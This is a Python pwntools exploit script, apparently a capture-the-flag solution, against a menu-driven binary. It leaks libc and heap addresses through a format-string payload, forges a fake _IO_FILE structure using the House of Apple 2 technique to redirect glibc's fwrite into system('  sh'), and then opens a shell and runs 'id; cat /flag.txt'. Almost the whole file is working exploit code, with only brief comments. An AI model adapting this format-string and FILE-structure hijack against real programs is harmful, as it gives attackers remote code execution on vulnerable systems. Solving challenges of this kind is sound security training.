#!/usr/bin/env python3

from pwn import args, context, flat, log, process, remote, u64

context.arch = "amd64"
context.log_level = "info"

SHARE = "./chal/share"

LEAK_OFF = 0x27741
SYSTEM = 0x54100
WFILE_JMP = 0x211228
FILE_TO_CHUNK = 0x50


def start():
    if args["LOCAL"]:
        return process([f"{SHARE}/ld-linux-x86-64.so.2", "--library-path", SHARE, f"{SHARE}/chal"])
    host = "localhost"
    port = 16767
    return remote(host, port)


def main():
    p = start()

    def reg(name):
        p.sendlineafter(b"> ", b"1")
        p.send(name)

    def update(slot, data):
        p.sendlineafter(b"> ", b"4")
        p.sendlineafter(b"slot: ", str(slot).encode())
        p.send(data)

    def show(slot):
        p.sendlineafter(b"> ", b"2")
        p.sendlineafter(b"slot: ", str(slot).encode())
        p.recvuntil(b"username: ")
        line = p.recvline()
        raw = p.recvn(0x48)
        return line, raw

    def login(slot):
        p.sendlineafter(b"> ", b"3")
        p.sendlineafter(b"slot: ", str(slot).encode())

    # Step 1: leak libc + heap in one show (format string + chunk dump)
    reg(b"%11$p")
    line, raw = show(0)
    libc_base = int(line.strip(), 16) - LEAK_OFF
    C = u64(raw[0x40:0x48]) - FILE_TO_CHUNK
    system = libc_base + SYSTEM
    wfile = libc_base + WFILE_JMP
    log.success("libc base = %#x", libc_base)
    log.success("chunk C   = %#x", C)

    # Step 2: forge a fake _IO_FILE in our chunk for House of Apple 2.

    # fmt: off
    payload = flat(
        {
            # The two leading spaces are flag bits.
            0x00: b"  sh",
            0x18: system,        # reused as _wide_vtable->__doallocate (see 0x1e0)
            0x40: C,             # _IO_buf_end aliases program's FILE* field -> fp = C
            0x88: C + 0xE0,      # _lock -> zeroed writable region (avoid NULL deref)
            0xA0: C + 0x100,     # _wide_data
            0xD8: wfile,         # vtable = _IO_wfile_jumps
            0x1E0: C - 0x50,     # _wide_data->_wide_vtable ; +0x68 = C+0x18 = system
        },
        length=0x200,
        filler=b"\x00"
    )
    # fmt: on
    update(0, payload)

    # Step 3: login -> fwrite -> ... -> system("  sh")
    login(0)

    p.sendline(b"id; cat /flag.txt")
    p.interactive()


if __name__ == "__main__":
    main()
